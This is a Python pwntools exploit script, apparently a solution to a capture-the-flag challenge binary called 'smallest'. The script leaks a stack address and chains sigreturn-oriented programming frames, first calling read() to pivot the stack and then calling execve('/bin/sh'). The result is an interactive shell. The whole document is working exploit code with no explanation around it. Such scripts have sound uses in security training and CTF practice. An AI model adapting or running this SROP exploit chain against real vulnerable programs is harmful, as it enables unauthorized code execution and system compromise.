from pwn import *
from LibcSearcher import *

binary_name = './smallest'

p = process(binary_name)
context.arch = 'amd64'

entry = 0x4000b0
syscall_ret = 0x4000be

payload = p64(entry) * 3
p.send(payload)

p.send('\xb3')
stack_addr = u64(p.recv()[8:16])
log.success('Found stack addr: 0x%x' % stack_addr)

# sigframe for read(0, new_stack_addr, 0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(entry) + 'a' * 8 + str(sigframe)
p.send(payload)

# send 15 bytes so that rax=15
sigreturn = p64(syscall_ret) + 'a' * 7
p.send(sigreturn)

# same thing, sigframe for execve('/bin/sh', 0, 0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(entry) + 'a' * 8 + str(sigframe)
payload += (0x120 - len(payload)) * 'a' + '/bin/sh\x00'
p.send(payload)

# then sigreturn
p.send(sigreturn)

p.interactive()
